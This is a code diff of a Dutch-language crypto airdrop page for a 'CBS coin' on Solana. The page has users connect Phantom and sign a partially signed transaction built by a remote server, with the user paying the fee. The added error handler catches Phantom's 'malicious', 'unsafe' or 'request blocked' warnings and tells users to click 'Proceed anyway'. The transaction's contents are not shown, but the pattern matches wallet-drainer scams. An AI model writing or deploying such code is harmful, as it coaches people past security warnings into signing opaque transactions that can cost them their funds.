@@ -113,7 +113,7 @@
   <!-- Airdrop front-end: gebruiker tekent & betaalt fee -->
   <script type="module">
     const ENDPOINT   = "https://cbs-coin.vercel.app/api/airdrop-cbs";
-    // Fallback voor raw send via je Vercel RPC-proxy (optioneel; laat staan)
+    // Optionele fallback: raw send via je RPC-proxy
     const RPC_PROXY  = "https://cbs-coin.vercel.app/api/rpc";
 
     const statusEl = document.getElementById("status");
@@ -144,7 +144,7 @@
         const { publicKey } = await phantom.connect({ onlyIfTrusted:false });
         statusEl.className = ""; statusEl.textContent = "⏳ Claim voorbereiden…";
 
-        // Vraag gedeeltelijk getekende tx op
+        // Vraag gedeeltelijk getekende tx op (feePayer = gebruiker)
         const resp = await fetch(ENDPOINT, {
           method: "POST",
           headers: { "content-type": "application/json" },
@@ -156,7 +156,7 @@
         }
 
         // Decode & verstuur
-        const { Transaction, Connection } = await import("https://esm.sh/@solana/web3.js@1.95.3");
+        const { Transaction } = await import("https://esm.sh/@solana/web3.js@1.95.3");
         const tx = Transaction.from(b64ToU8(data.tx));
 
         if (typeof phantom.signAndSendTransaction === "function") {
@@ -167,7 +167,7 @@
           return;
         }
 
-        // Fallback: signTransaction + sendRawTransaction via je proxy
+        // Fallback: signTransaction + sendRawTransaction via proxy
         const signed = await phantom.signTransaction(tx);
         const rawB64 = u8ToB64(signed.serialize());
         const rpcResp = await fetch(RPC_PROXY, {
@@ -189,10 +189,28 @@
         }
       } catch (e) {
         console.error(e);
-        setERR("❌ " + (e?.message || e));
+
+        const raw = (e?.message || e || "").toString();
+        const low = raw.toLowerCase();
+
+        if (
+          low.includes("request blocked") ||
+          (low.includes("blocked") && low.includes("phantom")) ||
+          low.includes("malicious") ||
+          low.includes("unsafe")
+        ) {
+          setERR(
+            `Phantom blokkeerde de aanvraag. Klik in Phantom op <b>“Proceed anyway”</b> om verder te gaan, 
+             of open deze site via <code>https://cbs-coin.vercel.app</code>.`
+          );
+        } else if (low.includes("user rejected") || low.includes("declined") || low.includes("rejected")) {
+          // nette melding als gebruiker zelf annuleert
+          setERR("Je hebt de aanvraag in Phantom geannuleerd.");
+        } else {
+          setERR("❌ " + raw);
+        }
       }
     });
   </script>
 </body>
 </html>
-
